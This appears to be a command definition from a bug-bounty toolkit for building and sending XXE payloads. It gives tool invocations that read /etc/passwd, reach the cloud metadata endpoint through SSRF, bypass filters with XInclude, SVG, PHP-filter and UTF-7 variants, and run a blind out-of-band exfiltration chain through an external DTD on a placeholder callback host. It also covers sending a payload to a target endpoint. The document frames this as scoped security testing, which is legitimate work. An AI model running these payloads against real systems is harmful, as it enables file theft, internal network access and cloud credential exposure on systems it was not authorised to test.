---
description: Build XXE payloads (file read, SSRF, OOB external-DTD exfil, XInclude, SVG, PHP filter, UTF-7) and optionally send one to an endpoint with SSRF/scope guards. Pairs with /oob for callback correlation. Usage: /xxe --kind file --path /etc/passwd | /xxe --kind oob --callback https://YOUR.oast.fun
---

# /xxe

Any XML parser that resolves external entities is a file-read/SSRF primitive. Find the one parser that
did not disable it.

**Load skill**: `skills/web2-vuln-classes/SKILL.md` §28 (XXE).

## Generate a payload

```bash
# Classic file read
python3 bughunter/tools/xxe_probe.py --kind file --path /etc/passwd

# SSRF to cloud metadata
python3 bughunter/tools/xxe_probe.py --kind ssrf \
  --url http://169.254.169.254/latest/meta-data/

# Blind OOB: writes payload.xml + oob.dtd; host the DTD at <callback>/oob.dtd
python3 bughunter/tools/xxe_probe.py --kind oob \
  --path /etc/passwd --callback https://YOUR.oast.fun --out payload.xml

# DOCTYPE stripped? try XInclude
python3 bughunter/tools/xxe_probe.py --kind xinclude --path /etc/passwd

# SVG upload/render path
python3 bughunter/tools/xxe_probe.py --kind svg --path /etc/passwd

# PHP source read (base64 in the entity value)
python3 bughunter/tools/xxe_probe.py --kind php-filter

# UTF-7 encoded variant (UTF-8 pattern-filter bypass)
python3 bughunter/tools/xxe_probe.py --kind utf7 --path /etc/passwd
```

## Send one payload (bounded, scope-guarded)

```bash
python3 bughunter/tools/xxe_probe.py --kind ssrf \
  --send https://target.com/api/import \
  --in-scope target.com --header 'Authorization=Bearer TEST' --show-response
```

`--send` performs **one** POST with `application/xml` through `safe_http` (SSRF guard + optional scope
guard). Without `--show-response` it prints only status/length. Do not use it to exfiltrate real data.

## OOB workflow

1. Start a listener: `python3 bughunter/tools/oob_listener.py` or `/oob`.
2. Host `oob.dtd` at `https://YOUR-CALLBACK/oob.dtd`.
3. Send `payload.xml` to the XML endpoint.
4. Watch DNS/HTTP: a callback proves external entity resolution. The DTD chain attempts to exfiltrate the file.
5. If no callback, try UTF-7, XInclude, or an SVG/Office-doc carrier.

## Injection points

XML upload/import, SOAP/WSDL, SAML, SVG, DOCX/XLSX/PPTX, RSS/Atom, sitemap import, PDF metadata,
config importers, enterprise integrations.

## False-positive gate

- Parser rejects DOCTYPE/external entities, or returns an error without substituted data.
- Only a generic parser error, no file/URL content.
- Internal file is public with no security value.
- Callback is from your browser, not the target.
- Blind callback only proves resolution — escalate to file/SSRF impact before reporting.

## Handoffs

`/oob` (interactsh correlation), `web2-vuln-classes` §23 LFI, `cloud-pentest` (metadata capability),
`triage-validation` → `report-writing`.